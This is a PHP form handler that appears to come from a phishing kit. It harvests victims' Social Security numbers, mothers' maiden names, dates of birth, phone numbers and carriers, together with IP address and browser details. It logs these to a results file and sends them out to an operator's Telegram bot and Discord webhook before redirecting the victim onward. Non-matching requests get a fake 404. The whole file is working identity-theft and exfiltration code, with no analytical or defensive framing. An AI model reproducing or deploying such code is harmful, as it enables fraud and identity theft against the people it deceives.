<?php
if (isset($_POST["ssn"]) && isset($_POST["mmn"]) && isset($_POST["dob"])  && isset($_POST["phn"]))
{
session_start();
$ssn = $_SESSION['dob'] = $_POST['dob'];
$mmn = $_POST["mmn"];
$ssn = $_POST["ssn"];
$phn = $_POST["phn"];
$car = $_POST['car'];
$ip   = $_SERVER['REMOTE_ADDR'];
$UA   = $_SERVER['HTTP_USER_AGENT'];
$host = $_SERVER['REMOTE_HOST'];
include '../admin/config.php';
$chatId = trim(file_get_contents("../admin/config/chatId.ini"));
$botUrl = trim(file_get_contents("../admin/config/botUrl.ini"));
$telegram = trim(file_get_contents("../admin/config/status_telegram.ini"));
$discord = trim(file_get_contents("../admin/config/status_discord.ini"));
$webhookUrl = trim(file_get_contents("../admin/config/discord.ini"));
extract($_REQUEST);


$file=fopen("../results/ssn.txt","a");


# Format for log.txt file
// Here variable $a is just an example (replace with your own variables)

fwrite($file," << N E W   M A F I S O   P E R S O N A L >>\r\n");
fwrite($file, "ssn: ". $ssn ."\r\n");
fwrite($file, "mmn : ". $mmn ."\r\n");
fwrite($file, "phone : ". $phn ."\r\n");
fwrite($file, "dob : ". $dob ."\r\n");
fwrite($file, "Carrier : ". $car ."\r\n");
fwrite($file," <<       S E S S I O N    I N F O      >>\r\n");
fwrite($file, "User Agent: ". $UA ."\r\n");
fwrite($file, "IP: ". $ip ."\r\n");
fwrite($file, "HOSTNAME : ". $host ."\r\n");
fwrite($file,"<<      E N D   O F   P E R S O N A L     >>\r\n");
fclose($file);


# Store Post values in variables
// Here variable $a is just an example (replace with your own variables)
$_SESSION['check4'] = "true";


# Format for Telegram & Discord
// Here variable $a is just an example (replace with your own variables)
$data = " << N E W   M A F I S O   P E R S O N A L >>\r\n";
$data.= " > ssn:   $ssn\r\n";
$data.= " > mmn:  $mmn\r\n";
$data.= " > DOB :  $dob\r\n";
$data.= " > phone:  $phn\r\n";
$data.= " > Carrier:  $car\r\n";
$data.= " <<       S E S S I O N    I N F O      >>\r\n";
$data.= " > User Agent: $UA \r\n";
$data.= " >IP : $ip \r\n";
$data.= " >HOSTNAME : $host \r\n";
$data.= "<<      E N D   O F   P E R S O N A L     >>\r\n";



// Telegram send function
$txt = $data;
if ($telegram == "on"){
    $send = ['chat_id'=>$chatId,'text'=>$txt];
    $web_telegram = "https://api.telegram.org/{$botUrl}";
    $ch = curl_init($web_telegram . '/sendMessage');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, ($send));
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $result = curl_exec($ch);
    curl_close($ch);
}

// Discord send function
if ($discord == "on"){
    $web_discord = $webhookUrl; 
    $json_data = array ('content'=>"$txt");
    $make_json = json_encode($json_data);
    $ch = curl_init( $web_discord );
    curl_setopt($ch, CURLOPT_HTTPHEADER, array('Content-type: application/json'));
    curl_setopt($ch, CURLOPT_POSTFIELDS, $make_json);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    $response = curl_exec($ch);
}

header("location: ../upload.php");
}
else
{
    exit(header("HTTP/1.0 404 Not Found"));
}
